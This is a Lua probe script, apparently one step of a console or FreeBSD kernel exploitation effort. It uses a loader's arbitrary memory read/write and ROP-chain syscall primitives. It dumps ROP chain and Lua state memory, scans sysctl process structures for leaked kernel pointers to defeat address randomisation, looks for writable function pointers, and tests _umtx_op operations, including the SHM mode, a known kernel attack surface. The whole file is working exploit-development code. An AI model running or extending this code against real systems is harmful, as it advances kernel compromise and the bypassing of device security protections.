-- CRASH_CLASS: MODERATE
-- PROBE 56k: Use native.read_buffer + gen_fcall_chain for kernel pointer search
--
-- Context: 56j discovered native.read_buffer(addr,len) for arbitrary memory read
-- and native.gen_fcall_chain() for full 6-arg syscalls via ROP chain.
-- Now we use these to:
--   1. Read the loader's own code (native.lua) to understand dispatch
--   2. Try sysctl reads with full arg control
--   3. Search for kernel pointers in unexplored memory regions

print("=== PROBE 56k: KERNEL POINTER SEARCH ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- ============================================================
-- SECTION A: Explore the fn_addr dispatch mechanism
-- ============================================================
print("")
print("--- A: FN_ADDR DISPATCH ---")

-- The fn_addr from the pipe is the syscall stub
local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt_addr(stub))

-- fn_addr is at 0x8_2xxxxxxx — module .text, likely XO — skip reading it
-- Instead check what address range it's in
local fn_h, fn_l = get_hi_lo(stub)
print(string.format("fn_addr range: hi=0x%X lo=0x%X", fn_h, fn_l))
print("(skipping read — likely XO memory)")

-- Read the ROP chain area instead (writable data, safe)
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if rop_str then
    local rop_addr = uint64(rop_str)
    print("ropchain addr=" .. rop_str)
    local ok_r, rbytes = pcall(function() return native.read_buffer(rop_addr, 64) end)
    if ok_r and rbytes then
        local hex = {}
        for i = 1, #rbytes do
            hex[#hex + 1] = string.format("%02X", rbytes:byte(i))
        end
        print("ropchain bytes: " .. table.concat(hex, " "))
    else
        print("ropchain read failed: " .. tostring(rbytes))
    end
end

-- ============================================================
-- SECTION B: Use fcall_with_rax for kinfo_proc deep scan
-- ============================================================
print("")
print("--- B: KINFO_PROC DEEP SCAN ---")

-- sysctl kern.proc.pid.<pid> returns kinfo_proc struct (1096 bytes)
-- Previous scans found no kernel pointers, but let's check with read_buffer
local sc_sysctl = make_syscall(202)
local mib = memory.alloc(16)
safe_wd(mib, 1)       -- CTL_KERN
safe_wd(mib + 4, 14)  -- KERN_PROC
safe_wd(mib + 8, 1)   -- KERN_PROC_PID
safe_wd(mib + 12, pid)
local outbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

-- Zero the output buffer
for i = 0, 0x7FF do
    pcall(function() memory.write_byte(outbuf + i, 0) end)
end

local ret = nil
pcall(function()
    ret = sc_sysctl(uint64(to_num(mib)), uint64(4), uint64(to_num(outbuf)),
        uint64(to_num(oldlenp)), uint64(0), uint64(0))
end)
local actual_len = safe_rd(oldlenp)
print("sysctl ret=" .. tostring(ret) .. " len=" .. tostring(actual_len))

-- Read the raw buffer with read_buffer for complete hex dump
if actual_len and actual_len > 0 then
    local rlen = math.min(actual_len, 0x800)
    -- Scan for kernel pointers (0xFFFF8xxx pattern in high dword)
    for off = 0, rlen - 8, 8 do
        local val = safe_rq(outbuf + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  KERNEL PTR at +0x%03X: 0x%08X_%08X", off, h, l))
            end
        end
    end
    print("  (scanned " .. rlen .. " bytes, no kernel pointers shown = none found)")
end

-- ============================================================
-- SECTION C: Search for kernel pointers in pivot_handler_rop
-- ============================================================
print("")
print("--- C: PIVOT_HANDLER ADDRESSES ---")

-- The jmpbuf, lua_state, lock, recover_from_call addresses
-- might be near kernel structures
local rop = native.pivot_handler_rop
if type(rop) == "table" then
    for k, v in pairs(rop) do
        if type(v) == "table" then
            local h, l = get_hi_lo(v)
            local prefix = ""
            if h >= 0xFFFF8000 then prefix = " *** KERNEL ***" end
            print(string.format("  %s = 0x%08X_%08X%s", k, h, l, prefix))
        elseif type(v) == "number" then
            print(string.format("  %s = %d", k, v))
        else
            print(string.format("  %s = %s (%s)", k, tostring(v), type(v)))
        end
    end
end

-- ============================================================
-- SECTION D: Attempt direct kernel VA read via read_buffer
-- ============================================================
print("")
print("--- D: KERNEL VA READ ATTEMPT ---")

-- The kernel base on FreeBSD is typically around 0xFFFFFFFF80000000
-- Try reading small amounts at common kernel base addresses
-- This will likely crash or return error, but worth trying
-- kernel VA reads removed - would crash past pcall (XOM/SMAP)

-- Actually, let's try something smarter: use sysctl to find
-- kern.proc.pathname to see if it leaks any kernel addresses
local mib2 = memory.alloc(16)
safe_wd(mib2, 1)       -- CTL_KERN
safe_wd(mib2 + 4, 14)  -- KERN_PROC
safe_wd(mib2 + 8, 12)  -- KERN_PROC_PATHNAME
safe_wd(mib2 + 12, pid)
local pathbuf = memory.alloc(0x400)
local pathlen = memory.alloc(8)
safe_wd(pathlen, 0x400)

local ret2 = nil
pcall(function()
    ret2 = sc_sysctl(uint64(to_num(mib2)), uint64(4), uint64(to_num(pathbuf)),
        uint64(to_num(pathlen)), uint64(0), uint64(0))
end)
local plen = safe_rd(pathlen)
print("kern.proc.pathname ret=" .. tostring(ret2) .. " len=" .. tostring(plen))

if plen and plen > 0 then
    local ok_p, path = pcall(function() return native.read_buffer(pathbuf, plen) end)
    if ok_p and path then
        print("  pathname=" .. path)
    end
end

-- ============================================================
-- SECTION E: Check for writable function pointers in loader
-- ============================================================
print("")
print("--- E: LOADER FUNCTION POINTERS ---")

-- The ROP chain references addresses like 0x311xxxxx which are in the loader's
-- data segment. Let's scan for function pointers in that area.
-- From the gen_fcall_chain output: stack_base=0x3110cf180, fn_addr=0x311279b10
-- retval_addr referenced 0x311327ce0, 0x3110d8e40, etc.

-- Read the Lua state pointer from pivot_handler_rop
if rop and type(rop.lua_state) == "table" then
    local ls_h, ls_l = get_hi_lo(rop.lua_state)
    local ls_addr = uint64(string.format("0x%X%08X", ls_h, ls_l))
    print("lua_state=" .. fmt_addr(ls_addr))

    -- Read some bytes around lua_state
    local ok_ls, ls_bytes = pcall(function() return native.read_buffer(ls_addr, 64) end)
    if ok_ls and ls_bytes then
        local hex_ls = {}
        for i = 1, #ls_bytes do
            hex_ls[#hex_ls + 1] = string.format("%02X", ls_bytes:byte(i))
        end
        print("  lua_state bytes: " .. table.concat(hex_ls, " "))
    end
end

-- ============================================================
-- SECTION F: Test UMTX on syscall 454 with proper args
-- ============================================================
print("")
print("--- F: UMTX_OP(454) TEST ---")

-- _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)
-- Try UMTX_OP_WAIT (5) and UMTX_OP_WAKE (6) first
local umtx_obj = memory.alloc(0x100)
safe_wq(umtx_obj, uint64(0))  -- Initialize to 0

-- UMTX_OP_WAIT = 5: wait on *obj == val (should return immediately if *obj != val)
local sc_umtx = make_syscall(454)
local ok_u, ret_u = pcall(function()
    return sc_umtx(uint64(to_num(umtx_obj)), uint64(5), uint64(1), uint64(0), uint64(0))
end)
print("umtx_op(WAIT,val=1) ok=" .. tostring(ok_u) .. " ret=" .. tostring(ret_u))

-- UMTX_OP_WAKE = 6: wake one waiter
local ok_w, ret_w = pcall(function()
    return sc_umtx(uint64(to_num(umtx_obj)), uint64(6), uint64(1), uint64(0), uint64(0))
end)
print("umtx_op(WAKE) ok=" .. tostring(ok_w) .. " ret=" .. tostring(ret_w))

-- UMTX_OP_SHM = 25
local ok_shm, ret_shm = pcall(function()
    return sc_umtx(uint64(to_num(umtx_obj)), uint64(25), uint64(0), uint64(0), uint64(0))
end)
print("umtx_op(SHM=25) ok=" .. tostring(ok_shm) .. " ret=" .. tostring(ret_shm))

-- UMTX_OP_ROBUST_LISTS = 26
local robust_list = memory.alloc(0x100)
local ok_rl, ret_rl = pcall(function()
    return sc_umtx(uint64(0), uint64(26), uint64(0x18), uint64(to_num(robust_list)), uint64(0))
end)
print("umtx_op(ROBUST_LISTS=26) ok=" .. tostring(ok_rl) .. " ret=" .. tostring(ret_rl))

-- Check what's in the obj after operations
local obj_val = safe_rq(umtx_obj)
print("umtx_obj value after ops=" .. fmt_addr(obj_val))

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56k COMPLETE ===")
